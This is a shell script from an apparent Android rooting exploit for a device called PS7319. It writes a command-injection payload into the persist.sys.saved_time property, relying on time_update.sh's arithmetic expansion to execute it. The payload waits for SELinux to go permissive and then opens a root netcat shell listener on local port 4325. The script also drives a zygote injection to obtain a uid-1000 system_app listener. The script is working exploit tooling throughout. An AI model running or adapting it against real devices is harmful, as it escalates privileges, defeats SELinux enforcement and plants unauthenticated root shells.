#!/bin/sh
set -eu

# PS7319 adaptation: arm the time_update waiter with an INLINE payload.
#
# The upstream file-based bootstrap (/data/securedStorageLocation/w/b) cannot
# work on PS7319: the live binary policy (precompiled_sepolicy, hash-verified
# against the shipped CILs) grants time_update NO read on assetstorage_data_file,
# cache_file, or any other staging-writable location. Its readable set is only
# shell_exec, toolbox_exec, time_update_exec, time_update_tmpfs, sysfs_devinfo.
#
# The redesigned trigger carries the whole payload inline, so no file read is
# needed while enforcing:
#
#   x[$(until [ "$(getenforce)" ];do sleep 1;done;toybox nc -s 127.0.0.1 -p 4325 -L sh&)]000
#
# Mechanism (time_update.sh, verified from the OTA image):
#   store_time=`getprop persist.sys.saved_time`
#   store_time=${store_time%???}          # strips the trailing 000
#   if (("$store_time" > "$system_time")) # arithmetic re-expands $(...) -> executes
# - getenforce is DENIED to time_update while enforcing (avc denial -> empty
#   output), becomes readable the moment the carrier's NULL-write flips
#   Permissive -> the loop's break condition is the Permissive signal itself.
# - nc then binds 127.0.0.1:4325 with sh per connection. TCP sockets are
#   denied to time_update while enforcing but allowed once Permissive.
# - The trailing & backgrounds nc so the command substitution completes and
#   time_update.sh exits cleanly.
#
# The trigger is 90 bytes, within PROP_VALUE_MAX (91) for API 28.
# Safety: if anything fails, the property can always be restored to its
# numeric snapshot via the uid-1000 channel (disarm path unchanged).

repo_dir="$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)"
adb_bin="${ADB:-$repo_dir/tools/adb-portable.sh}"
payload_host="${1:-}"
old_time_file=/data/local/tmp/__reroot_old_time
trigger='x[$(until [ "$(getenforce)" ];do sleep 1;done;toybox nc -s 127.0.0.1 -p 4325 -L sh&)]000'

adb() { "$adb_bin" "$@"; }
die() { echo "FATAL: $*" >&2; exit 1; }

# The inline trigger needs no payload file; keep the argument for interface
# compatibility with root_poc.sh (payload is delivered via the root listener).
[ -n "$payload_host" ] && echo "note: inline trigger ignores payload file ($payload_host)"

exempt="$(adb shell 'settings get global hidden_api_blacklist_exemptions' | tr -d '\r')"
[ "$exempt" = null ] || die "stale exemptions value: $exempt"

old_time="$(adb shell getprop persist.sys.saved_time | tr -d '\r')"
case "$old_time" in
  ''|*[!0-9]*) die "saved_time is not a clean numeric value: $old_time" ;;
esac

adb shell "printf '%s' '$old_time' > $old_time_file; chmod 0644 $old_time_file"

identity="$(printf 'id\nexit\n' | adb shell 'toybox nc -w 3 127.0.0.1 4321' | tr -d '\r')"
case "$identity" in
  *uid=1000*context=u:r:system_app:s0*)
    echo "reusing existing uid-1000 staging listener"
    ;;
  *)
    # A lost settings-put does NOT consume the boot's one-shot (zygote never
    # observed it), so retrying the injection is safe. Observed live: puts at
    # +9s/+45s after boot were silently lost; the same put at +3min worked.
    attempt=0
    until [ "$attempt" -ge 5 ]; do
      attempt=$((attempt + 1))
      adb shell < "$repo_dir/scripts/zygote_payload_system_app.sh" >/dev/null
      sleep 5
      identity="$(printf 'id\nexit\n' | adb shell 'toybox nc -w 3 127.0.0.1 4321' | tr -d '\r')"
      case "$identity" in
        *uid=1000*context=u:r:system_app:s0*) break ;;
      esac
      echo "injection attempt $attempt not observed yet; waiting 30s before retry"
      sleep 30
    done
    case "$identity" in
      *uid=1000*context=u:r:system_app:s0*) : ;;
      *) die "uid-1000 staging listener failed after $attempt injection attempts: $identity" ;;
    esac
    ;;
esac

{
  printf 'setprop persist.sys.saved_time \047%s\047\n' "$trigger"
  printf 'log -t REROOTWAIT "armed=$(getprop persist.sys.saved_time)"\n'
  printf 'exit\n'
} | adb shell 'toybox nc -w 10 127.0.0.1 4321' >/dev/null

sleep 3
exempt="$(adb shell 'settings get global hidden_api_blacklist_exemptions' | tr -d '\r')"
[ "$exempt" = null ] || die "exemptions cleanup failed: $exempt"
armed="$(adb shell getprop persist.sys.saved_time | tr -d '\r')"
[ "$armed" = "$trigger" ] || die "waiter property was not armed: $armed"

echo "waiter armed (inline trigger); restore_value=$old_time"
echo "no bootstrap file needed; payload arrives via the 4325 root listener"
echo "reboot before running reroot_after_boot.sh"